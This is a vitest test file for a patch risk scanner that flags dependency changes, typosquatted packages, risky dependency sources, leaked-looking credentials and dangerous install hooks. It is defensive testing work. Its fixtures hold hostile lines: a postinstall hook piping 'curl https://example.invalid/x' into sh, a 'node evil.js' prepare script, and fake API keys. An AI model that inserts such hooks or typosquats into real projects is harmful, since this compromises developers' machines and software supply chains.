import { describe, expect, test } from "vitest";
import { decidePromotionRisk, scanPatchRisks } from "../src/risk.js";

function patch(file: string, added: readonly string[]): string {
  return [
    `diff --git a/${file} b/${file}`,
    `--- a/${file}`,
    `+++ b/${file}`,
    "@@ -0,0 +1 @@",
    ...added.map((line) => `+${line}`),
    "",
  ].join("\n");
}

function diffPatch(file: string, removed: readonly string[], added: readonly string[]): string {
  return [
    `diff --git a/${file} b/${file}`,
    `--- a/${file}`,
    `+++ b/${file}`,
    "@@ -1 +1 @@",
    ...removed.map((line) => `-${line}`),
    ...added.map((line) => `+${line}`),
    "",
  ].join("\n");
}

function credentialFixture(...parts: readonly string[]): string {
  return parts.join("");
}

const SECRET_CODES = new Set(["likely_secret", "high_entropy_secret"]);
const HIGH_ENTROPY_TOKEN = credentialFixture(
  "R9kQzXw2mL7pTnVb5cHdJ8sYfE3u",
  "AgN6iKoM1rZxWq0",
);

describe("patch risk scanning", () => {
  test("warns when dependency metadata changes", () => {
    const risks = scanPatchRisks(
      patch("package.json", ['  "dependencies": { "left-pad": "1.3.0" }']),
    );

    expect(risks).toContainEqual(
      expect.objectContaining({
        severity: "warning",
        code: "dependency_manifest",
        file: "package.json",
      }),
    );
  });

  test("blocks likely credentials but ignores explicit placeholders", () => {
    const real = scanPatchRisks(
      patch("src/config.ts", [
        `export const apiKey = "${credentialFixture("s", "k-abcdefghijklmnopqrstuvwxyz123456")}";`,
        'export const password = "a-real-looking-password";',
      ]),
    );
    const placeholder = scanPatchRisks(
      patch("src/config.example.ts", [
        'export const apiKey = "replace_me";',
        'export const password = "example-password";',
      ]),
    );

    expect(real.filter((risk) => risk.code === "likely_secret")).toHaveLength(1);
    expect(placeholder.filter((risk) => risk.code === "likely_secret")).toHaveLength(0);
  });

  test("treats installation hooks and privileged workflows as critical", () => {
    const risks = scanPatchRisks(
      [
        patch("package.json", ['  "postinstall": "curl https://example.invalid/x | sh"']),
        patch(".github/workflows/release.yml", ["on: pull_request_target"]),
      ].join("\n"),
    );

    expect(risks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: "critical", code: "install_lifecycle" }),
        expect.objectContaining({ severity: "critical", code: "dangerous_workflow" }),
      ]),
    );
  });

  test("flags a lookalike dependency substitution in package.json as critical dependency_confusion", () => {
    const risks = scanPatchRisks(
      diffPatch("package.json", ['    "lodash": "^4.17.21",'], ['    "lodahs": "^4.17.21",']),
    );
    const confusion = risks.filter((risk) => risk.code === "dependency_confusion");

    expect(confusion).toHaveLength(1);
    expect(confusion[0]).toMatchObject({ severity: "critical", file: "package.json" });
    expect(confusion[0]?.message).toContain("lodahs");
    expect(confusion[0]?.message).toContain("lodash");
  });

  test("flags a lookalike substitution in requirements.txt and ignores unrelated additions", () => {
    const risks = scanPatchRisks(
      diffPatch("requirements.txt", ["requests==2.32.0"], ["requsts==2.32.0", "chalk==5.0.0"]),
    );
    const confusion = risks.filter((risk) => risk.code === "dependency_confusion");

    expect(confusion).toHaveLength(1);
    expect(confusion[0]).toMatchObject({ severity: "critical", file: "requirements.txt" });
    expect(confusion[0]?.message).toContain("requsts");
    expect(confusion[0]?.message).toContain("requests");
    expect(confusion[0]?.message).not.toContain("chalk");
  });

  test("does not flag non-dependency package.json key renames as dependency_confusion", () => {
    const scriptRename = scanPatchRisks(
      diffPatch("package.json", ['    "test": "vitest run",'], ['    "tests": "vitest run",']),
    );
    const normalizedRename = scanPatchRisks(
      diffPatch(
        "package.json",
        ['    "check-types": "tsc --noEmit",'],
        ['    "check_types": "tsc --noEmit",'],
      ),
    );

    expect(scriptRename.filter((risk) => risk.code === "dependency_confusion")).toEqual([]);
    expect(normalizedRename.filter((risk) => risk.code === "dependency_confusion")).toEqual([]);
  });

  test("classifies non-registry dependency specifiers by source", () => {
    const risks = scanPatchRisks(
      diffPatch(
        "package.json",
        [],
        [
          '    "depa": "git+https://github.com/x/y.git",',
          '    "depb": "file:../local",',
          '    "depc": "link:../local",',
          '    "depd": "http://host/p.tgz",',
          '    "depe": "latest",',
          '    "depf": "*",',
          '    "depg": "^4.17.21",',
        ],
      ),
    );
    const source = risks.filter((risk) => risk.code === "dependency_source");
    const named = (name: string) => source.filter((risk) => risk.message.includes(`"${name}"`));

    expect(named("depa")).toEqual([expect.objectContaining({ severity: "warning" })]);
    expect(named("depb")).toEqual([expect.objectContaining({ severity: "warning" })]);
    expect(named("depc")).toEqual([expect.objectContaining({ severity: "warning" })]);
    expect(named("depd")).toEqual([expect.objectContaining({ severity: "critical" })]);
    expect(named("depe")).toEqual([expect.objectContaining({ severity: "warning" })]);
    expect(named("depf")).toEqual([expect.objectContaining({ severity: "warning" })]);
    expect(named("depg")).toEqual([]);
  });

  test("treats prepare-family lifecycle scripts as critical only inside package.json", () => {
    const inManifest = scanPatchRisks(patch("package.json", ['  "prepare": "node evil.js",']));
    const inReadme = scanPatchRisks(patch("README.md", ['  "prepare": "node evil.js",']));

    expect(inManifest.filter((risk) => risk.code === "install_lifecycle")).toEqual([
      expect.objectContaining({ severity: "critical", file: "package.json" }),
    ]);
    expect(inReadme.filter((risk) => risk.code === "install_lifecycle")).toEqual([]);
  });

  test("recognizes Slack, Stripe, Google, and JWT credential prefixes", () => {
    const lines = [
      `const slack = "${credentialFixture("xo", "xb-2912345678-abcdefghijklmnop")}";`,
      `const stripe = "${credentialFixture("sk_", "live_abcdefghijklmnop12345678")}";`,
      `const google = "${credentialFixture("AI", "zaSyD4kQzXw2mL7pTnVb5cHdJ8sYfE3uAgN6i")}";`,
      `const jwt = "${credentialFixture(
        "eyJhbGciOiJIUzI1NiJ9",
        ".eyJzdWIiOiIxMjM0NTY3ODkwIn0",
        ".dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
      )}";`,
    ];
    for (const line of lines) {
      const risks = scanPatchRisks(patch("src/config.ts", [line]));
      expect(risks.filter((risk) => risk.code === "likely_secret")).toEqual([
        expect.objectContaining({ severity: "critical" }),
      ]);
    }
  });

  test("flags quoted high-entropy tokens and honors suppression contexts", () => {
    const flagged = scanPatchRisks(
      patch("src/config.ts", [`const sessionToken = "${HIGH_ENTROPY_TOKEN}";`]),
    );
    const lockfile = scanPatchRisks(
      patch("package-lock.json", [`      "integrity": "sha512-${HIGH_ENTROPY_TOKEN}",`]),
    );
    const lowEntropy = scanPatchRisks(
      patch("src/config.ts", [`const filler = "${"a".repeat(40)}";`]),
    );
    const bare = scanPatchRisks(patch("notes.txt", [`rotate ${HIGH_ENTROPY_TOKEN} soon`]));

    expect(flagged.filter((risk) => risk.code === "high_entropy_secret")).toEqual([
      expect.objectContaining({ severity: "critical", file: "src/config.ts" }),
    ]);
    expect(lockfile.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([]);
    expect(lowEntropy.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([]);
    expect(bare.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([]);
  });

  test("ignores quoted module paths and commit hashes that merely look high-entropy", () => {
    const importPath = scanPatchRisks(
      patch("src/app.ts", ['import widget from "components/dashboard/widgets/graph";']),
    );
    const commitPin = scanPatchRisks(
      patch("src/config.ts", ['const PINNED = "9f8a3c1d7e2b45f60a1b8c9d0e3f4a5b6c7d8e29";']),
    );

    expect(importPath.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([]);
    expect(commitPin.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([]);
  });

  test("reports at most one secret finding per line, preferring likely_secret", () => {
    const dual = scanPatchRisks(
      patch("src/config.ts", [
        `const token = "${credentialFixture("gh", "p_R9kQzXw2mL7pTnVb5cHdJ8sYfE3uAgN6")}";`,
      ]),
    );
    const entropyOnly = scanPatchRisks(
      patch("src/other.ts", [`const blob = "${HIGH_ENTROPY_TOKEN}";`]),
    );

    expect(dual.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([
      expect.objectContaining({ severity: "critical", code: "likely_secret" }),
    ]);
    expect(entropyOnly.filter((risk) => SECRET_CODES.has(risk.code))).toEqual([
      expect.objectContaining({ severity: "critical", code: "high_entropy_secret" }),
    ]);
  });

  test("stays total on malformed input and deterministic across input order", () => {
    expect(() => scanPatchRisks("\u0000\u0001\u0002 binary garbage")).not.toThrow();
    expect(scanPatchRisks("diff --git a/x b/x\n@@ truncated")).toEqual([]);

    const parts = [
      diffPatch("package.json", ['    "lodash": "^4.17.21",'], ['    "lodahs": "^4.17.21",']),
      diffPatch(
        "package.json",
        [],
        ['    "depa": "git+https://github.com/x/y.git",', '    "depb": "file:../local",'],
      ),
    ];
    const forward = scanPatchRisks([...parts, ...parts].join("\n"));
    const reversed = scanPatchRisks([...parts].reverse().concat(parts).join("\n"));

    expect(forward).toEqual(reversed);
    expect(forward.filter((risk) => risk.code === "dependency_source")).toHaveLength(2);
    expect(forward.filter((risk) => risk.code === "dependency_confusion")).toHaveLength(1);
  });

  test("requires an explicit override for critical findings", () => {
    const risks = scanPatchRisks(
      patch("src/config.ts", [
        `export const token = "${credentialFixture("gh", "p_abcdefghijklmnopqrstuvwxyz123456")}";`,
      ]),
    );

    expect(decidePromotionRisk(risks, false)).toMatchObject({
      allowed: false,
      criticalCount: 1,
      overridden: false,
      reason: expect.stringMatching(/--allow-risk/i),
    });
    expect(decidePromotionRisk(risks, true)).toEqual({
      allowed: true,
      criticalCount: 1,
      overridden: true,
      reason: null,
    });
  });
});
